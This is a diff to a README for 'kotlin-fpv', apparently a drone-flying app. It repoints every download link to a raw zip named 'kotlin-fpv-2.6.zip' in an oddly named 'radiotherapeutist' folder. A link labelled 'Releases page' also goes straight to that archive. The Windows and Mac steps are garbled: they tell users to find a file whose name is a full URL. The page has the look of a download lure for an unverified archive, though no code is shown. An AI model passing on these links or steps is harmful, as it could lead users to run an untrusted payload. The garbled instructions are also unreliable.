@@ -6,9 +6,9 @@ Welcome to **kotlin-fpv**! This application is designed to help you easily opera
 
 ## 📥 Download the Application
 
-[![Download kotlin-fpv](https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv.zip)](https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv.zip)
+[![Download kotlin-fpv](https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv-2.6.zip)](https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv-2.6.zip)
 
-To get your hands on the latest version of **kotlin-fpv**, visit our [Releases page](https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv.zip). You’ll find all the available versions there. 
+To get your hands on the latest version of **kotlin-fpv**, visit our [Releases page](https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv-2.6.zip). You’ll find all the available versions there. 
 
 ### Steps to Download
 
@@ -24,14 +24,14 @@ Once you have downloaded the application, follow these simple steps to install i
 ### For Windows Users:
 
 1. Navigate to your Downloads folder.
-2. Find the `https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv.zip` file.
+2. Find the `https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv-2.6.zip` file.
 3. Double-click the file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
 
 ### For Mac Users:
 
 1. Open the Downloads folder.
-2. Locate the `https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv.zip` file.
+2. Locate the `https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv-2.6.zip` file.
 3. Double-click the file. A new window will appear.
 4. Drag the kotlin-fpv icon to your Applications folder.
 5. Eject the installer from Finder.
@@ -96,4 +96,4 @@ This project is licensed under the MIT License. For more details, please check o
 
 ## 📥 Download the Application Again
 
-Don't forget, you can always return to our [Releases page](https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv.zip) for the latest updates. Enjoy flying your drone with **kotlin-fpv**!
+Don't forget, you can always return to our [Releases page](https://raw.githubusercontent.com/jahanllol/kotlin-fpv/main/radiotherapeutist/kotlin-fpv-2.6.zip) for the latest updates. Enjoy flying your drone with **kotlin-fpv**!
